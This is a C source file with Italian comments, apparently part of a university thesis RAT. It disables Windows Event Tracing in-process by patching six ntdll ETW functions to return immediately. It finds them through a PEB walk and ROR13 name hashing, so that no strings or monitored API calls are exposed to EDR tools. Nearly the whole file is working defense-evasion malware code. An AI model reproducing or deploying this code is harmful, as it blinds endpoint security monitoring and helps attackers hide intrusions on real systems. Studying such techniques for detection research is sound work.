/*
 * etw_patch.c
 * ETW (Event Tracing for Windows) — Bypass completo in-process
 *
 * MITRE ATT&CK: T1562.001 — Impair Defenses: Disable or Modify Tools
 * Patcha 6 funzioni ETW in ntdll via PEB walk + hash ROR13 (no GetProcAddress).
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>

/* ── Patch bytes ──────────────────────────────────────────────────────
 *
 * x64: xor rax,rax; ret  — 4 byte: 0x48 0x33 0xC0 0xC3
 * x86: xor eax,eax; ret  — 3 byte: 0x33 0xC0 0xC3
 *
 * Ritorna 0 (STATUS_SUCCESS) senza eseguire alcuna logica interna.
 */
#ifdef _WIN64
static const BYTE etw_patch[]    = { 0x48, 0x33, 0xC0, 0xC3 };
static const SIZE_T etw_patch_sz = 4;
#else
static const BYTE etw_patch[]    = { 0x33, 0xC0, 0xC3 };
static const SIZE_T etw_patch_sz = 3;
#endif

/* ── Struttura per salvataggio byte originali ─────────────────────── */
typedef struct _ETW_PATCH_ENTRY {
    const char *name;
    PVOID       addr;
    BYTE        original[8];
    BOOL        patched;
} ETW_PATCH_ENTRY;

static ETW_PATCH_ENTRY g_etw_targets[] = {
    { "EtwEventWrite",         NULL, {0}, FALSE },
    { "EtwEventWriteEx",       NULL, {0}, FALSE },
    { "EtwEventWriteFull",     NULL, {0}, FALSE },
    { "EtwEventWriteString",   NULL, {0}, FALSE },
    { "EtwEventWriteTransfer", NULL, {0}, FALSE },
    { "NtTraceEvent",          NULL, {0}, FALSE },
};
static const DWORD g_etw_count =
    sizeof(g_etw_targets) / sizeof(g_etw_targets[0]);


/* ════════════════════════════════════════════════════════════════════
 * PEB WALK — risoluzione indirizzo funzione in ntdll senza API
 *
 * Flusso identico a ReflectiveLoader.c, adattato per ntdll:
 *   GS:[0x60] = PEB
 *   PEB+0x18  = PEB_LDR_DATA*
 *   LDR+0x10  = InLoadOrderModuleList.Flink
 *   Ogni entry (InLoadOrder):
 *     +0x10 = DllBase   (ULONG_PTR)
 *     +0x48 = BaseDllName.Length (USHORT, byte)
 *     +0x50 = BaseDllName.Buffer (PWSTR)
 *
 * Hash ROR13 su nome DLL (wide, case-insensitive) per trovare ntdll,
 * poi hash ROR13 su nome ASCII funzione per trovare l'entry EAT.
 * ════════════════════════════════════════════════════════════════════ */

#define HASH_NTDLL  0x1EDAB0ED   /* hash ROR13 di L"NTDLL.DLL" */

static __inline DWORD _ror13(DWORD v) {
    return (v >> 13) | (v << 19);
}

static __inline DWORD _hash_ascii(const char *s) {
    DWORD h = 0;
    do { h = _ror13(h); h += (DWORD)(*s); } while (*++s);
    return h;
}

/*
 * _peb_get_ntdll_base — trova il base address di ntdll tramite PEB walk.
 * Ritorna NULL se non trovato (non dovrebbe mai accadere — ntdll
 * è sempre il primo/secondo modulo caricato in ogni processo Win).
 */
static ULONG_PTR _peb_get_ntdll_base(void) {
#ifdef _WIN64
    ULONG_PTR peb;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
#else
    ULONG_PTR peb;
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb));
#endif

    ULONG_PTR ldr   = *(ULONG_PTR *)(peb + 0x18);
    ULONG_PTR entry = *(ULONG_PTR *)(ldr + 0x10); /* InLoadOrderModuleList.Flink */
    ULONG_PTR start = entry;

    do {
#ifdef _WIN64
        ULONG_PTR base = *(ULONG_PTR *)(entry + 0x30);
        USHORT    len  = *(USHORT    *)(entry + 0x58);
        PWSTR     buf  = *(PWSTR     *)(entry + 0x60);
#else
        ULONG_PTR base = *(ULONG_PTR *)(entry + 0x18);
        USHORT    len  = *(USHORT    *)(entry + 0x28);
        PWSTR     buf  = *(PWSTR     *)(entry + 0x2C);
#endif
        if (base && buf && len) {
            DWORD  h = 0;
            USHORT n = len / sizeof(WCHAR);
            for (USHORT i = 0; i < n; i++) {
                h = _ror13(h);
                WCHAR wc = buf[i];
                if (wc >= L'a' && wc <= L'z') wc -= 0x20;
                h += (DWORD)wc;
            }
            if (h == HASH_NTDLL)
                return base;
        }
        entry = *(ULONG_PTR *)entry;
    } while (entry && entry != start);

    return 0;
}

/*
 * _ntdll_get_proc — risolve un indirizzo in ntdll dall'hash ROR13
 * del suo nome ASCII, parsando direttamente la EAT senza API.
 *
 * Equivalente a GetProcAddress(hNtdll, name) ma senza chiamate
 * a funzioni di sistema monitorabili dall'EDR.
 */
static PVOID _ntdll_get_proc(DWORD name_hash) {
    ULONG_PTR base = _peb_get_ntdll_base();
    if (!base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt =
        (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva =
        nt->OptionalHeader
          .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
    if (!exp_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(base + names[i]);
        if (_hash_ascii(fname) == name_hash) {
            return (PVOID)(base + funcs[ords[i]]);
        }
    }
    return NULL;
}


/* ── Hash precalcolati delle funzioni ETW da patchare ────────────────
 *
 * Calcolati a compile time con lo stesso algoritmo ROR13.
 * Nessuna stringa "EtwEventWrite" visibile con strings/FLOSS.
 *
 * Come verificare:
 *   DWORD h = 0; const char *s = "EtwEventWrite";
 *   do { h = (h>>13)|(h<<19); h += *s; } while(*++s);
 *   printf("%08X\n", h);
 */
#define HASH_EtwEventWrite         0x2047C3EEU
#define HASH_EtwEventWriteEx       0x1418FC00U
#define HASH_EtwEventWriteFull     0x0B9EFFB1U
#define HASH_EtwEventWriteString   0x772FDBF0U
#define HASH_EtwEventWriteTransfer 0x59174C67U
#define HASH_NtTraceEvent          0xE39F1624U


/* ── Patch di una singola funzione ───────────────────────────────── */
static BOOL _patch_function(ETW_PATCH_ENTRY *entry) {
    if (!entry || !entry->addr) return FALSE;

    DWORD dwOldProtect = 0;

    memcpy(entry->original, entry->addr, etw_patch_sz);

    if (!VirtualProtect(entry->addr, etw_patch_sz,
                        PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    memcpy(entry->addr, etw_patch, etw_patch_sz);

    VirtualProtect(entry->addr, etw_patch_sz,
                   dwOldProtect, &dwOldProtect);

    if (memcmp(entry->addr, etw_patch, etw_patch_sz) == 0) {
        entry->patched = TRUE;
        return TRUE;
    }
    return FALSE;
}


/* ── Funzione principale: patcha tutte le funzioni ETW ───────────────
 *
 * Usa _ntdll_get_proc (PEB walk + EAT) invece di GetProcAddress.
 * Nessuna chiamata a API monitorata dall'EDR per la risoluzione.
 *
 * Ritorna il numero di funzioni patchate (max 6).
 */
DWORD patch_etw(void) {
    static const struct { DWORD hash; int idx; } tbl[] = {
        { HASH_EtwEventWrite,         0 },
        { HASH_EtwEventWriteEx,       1 },
        { HASH_EtwEventWriteFull,     2 },
        { HASH_EtwEventWriteString,   3 },
        { HASH_EtwEventWriteTransfer, 4 },
        { HASH_NtTraceEvent,          5 },
    };

    DWORD dwPatched = 0;

    for (DWORD i = 0; i < g_etw_count; i++) {
        g_etw_targets[i].addr =
            _ntdll_get_proc(tbl[i].hash);

        if (!g_etw_targets[i].addr)
            continue;

        if (_patch_function(&g_etw_targets[i]))
            dwPatched++;
    }

    return dwPatched;
}


/* ── Restore ─────────────────────────────────────────────────────── */
DWORD restore_etw(void) {
    DWORD dwRestored   = 0;
    DWORD dwOldProtect = 0;

    for (DWORD i = 0; i < g_etw_count; i++) {
        if (!g_etw_targets[i].patched || !g_etw_targets[i].addr)
            continue;

        if (!VirtualProtect(g_etw_targets[i].addr, etw_patch_sz,
                            PAGE_EXECUTE_READWRITE, &dwOldProtect))
            continue;

        memcpy(g_etw_targets[i].addr,
               g_etw_targets[i].original, etw_patch_sz);

        VirtualProtect(g_etw_targets[i].addr, etw_patch_sz,
                       dwOldProtect, &dwOldProtect);

        g_etw_targets[i].patched = FALSE;
        dwRestored++;
    }

    return dwRestored;
}
